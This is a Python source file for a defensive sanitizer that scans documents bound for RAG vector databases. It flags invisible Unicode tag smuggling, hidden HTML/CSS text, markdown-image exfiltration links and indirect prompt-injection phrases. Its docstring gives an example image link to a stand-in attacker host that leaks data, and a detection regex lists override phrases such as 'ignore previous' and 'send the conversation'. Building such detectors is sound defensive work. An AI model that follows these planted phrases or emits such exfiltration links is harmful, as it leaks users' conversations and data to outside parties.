#!/usr/bin/env python3
"""
RAG Poison Guard (rag_guard.py)
Zero-Dependency Ingestion Sanitizer & Security Firewall for AI RAG Pipelines & Vector DBs.
Detects & neutralizes:
  1. Invisible Unicode Tag Smuggling (U+E0000..U+E007F) & Zero-Width / BiDi Trojan Source overrides
  2. Markdown Image Data-Exfiltration (![...](https://attacker.com/leak?data=...))
  3. Hidden HTML/CSS Prompt Injections (<!-- ... -->, display:none, opacity:0, font-size:0)
  4. Embedded Indirect Prompt Injection Directives inside untrusted documents
Author: Wallison Araujo (@WallisonWS) | License: MIT
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from pathlib import Path
from typing import Any, Dict, List


INVISIBLE_RX = re.compile(r"[\u200b-\u200f\u202a-\u202e\u2060-\u206f\ufeff\U000e0000-\U000e007f]")
MD_EXFIL_RX = re.compile(r"!\[[^\]]*\]\((https?://[^)\s]+)\)", re.IGNORECASE)
HTML_COMMENT_RX = re.compile(r"<!--[\s\S]*?-->", re.IGNORECASE)
HIDDEN_STYLE_RX = re.compile(r"<[^>]+style\s*=\s*['\"][^'\"]*(?:display\s*:\s*none|opacity\s*:\s*0|font-size\s*:\s*0|color\s*:\s*(?:white|#fff|#ffffff))[^'\"]*['\"][^>]*>[\s\S]*?</[^>]+>", re.IGNORECASE)
INDIRECT_INJ_RX = re.compile(r"(?i)\b(?:ignore previous|disregard above|new system instruction|exfiltrate|send the conversation|append .* to the url|render an image from)\b")


def decode_unicode_tags(text: str) -> str:
    """Decode ASCII characters smuggled inside Unicode Tags block U+E0000..U+E007F."""
    decoded = []
    for ch in text:
        cp = ord(ch)
        if 0xE0020 <= cp <= 0xE007E:
            decoded.append(chr(cp - 0xE0000))
    return "".join(decoded)


def sanitize_document(raw_text: str) -> Dict[str, Any]:
    findings: List[Dict[str, Any]] = []
    clean = raw_text

    # 1. Invisible Unicode & Tag Smuggling
    inv_matches = INVISIBLE_RX.findall(clean)
    if inv_matches:
        hidden_ascii = decode_unicode_tags(clean)
        findings.append({
            "type": "Invisible Unicode / BiDi / Tag Smuggling",
            "severity": "CRITICAL",
            "count": len(inv_matches),
            "decoded_hidden_text": hidden_ascii[:120] if hidden_ascii else None,
        })
        clean = INVISIBLE_RX.sub("", clean)

    # 2. Hidden HTML Comments
    comments = HTML_COMMENT_RX.findall(clean)
    if comments:
        findings.append({"type": "Hidden HTML Comments Stripped", "severity": "HIGH", "count": len(comments)})
        clean = HTML_COMMENT_RX.sub("", clean)

    # 3. Hidden CSS text (white-on-white / display:none / font-size:0)
    hidden_nodes = HIDDEN_STYLE_RX.findall(clean)
    if hidden_nodes:
        findings.append({"type": "Hidden CSS/HTML Prompt Injection Nodes", "severity": "CRITICAL", "count": len(hidden_nodes)})
        clean = HIDDEN_STYLE_RX.sub("", clean)

    # 4. Markdown Image Exfiltration Links
    exfil_links = MD_EXFIL_RX.findall(clean)
    if exfil_links:
        findings.append({"type": "External Markdown Image Exfiltration Vector", "severity": "HIGH", "urls": exfil_links})
        clean = MD_EXFIL_RX.sub("[BLOCKED_EXTERNAL_IMAGE]", clean)

    # 5. Indirect Prompt Injection phrases
    inj = INDIRECT_INJ_RX.findall(clean)
    if inj:
        findings.append({"type": "Indirect Prompt Injection Directive", "severity": "CRITICAL", "matches": list(set(inj))})

    quarantine = any(f["severity"] == "CRITICAL" for f in findings)
    return {
        "verdict": "QUARANTINE" if quarantine else "SANITIZED" if findings else "CLEAN",
        "findings_count": len(findings),
        "findings": findings,
        "sanitized_text": clean.strip(),
    }


def main(argv: List[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="rag-guard", description="Defend RAG Vector DBs against Poisoned Docs & Indirect Prompt Injection")
    parser.add_argument("source", help="Path to Markdown/HTML/TXT document or raw text")
    parser.add_argument("--out", help="Optional path to save sanitized document")
    args = parser.parse_args(argv)

    p = Path(args.source)
    raw = p.read_text(encoding="utf-8", errors="ignore") if p.is_file() else args.source
    result = sanitize_document(raw)
    if args.out:
        Path(args.out).write_text(result["sanitized_text"], encoding="utf-8")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    return 2 if result["verdict"] == "QUARANTINE" else 0


if __name__ == "__main__":
    sys.exit(main())
